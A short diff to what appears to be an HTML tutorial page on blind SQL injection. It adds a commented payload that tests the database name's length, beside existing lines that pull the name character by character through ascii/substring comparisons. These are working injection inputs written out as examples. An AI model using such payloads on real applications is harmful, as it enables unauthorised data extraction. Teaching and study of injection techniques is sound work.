@@ -125,6 +125,7 @@
             <h2>数据库信息获取</h2>
             <p>这里展示了一些获取数据库相关信息的代码。</p>
             <pre><code>
+-- select * from users where id='1' and (select length(database()))=8 --'
 -- 数据库长度:8 ,数据库名:115 101 99 117
 -- select * from users where id='1' and ascii(substring(database(),1,1))>=115 -- ' 
             </code></pre>
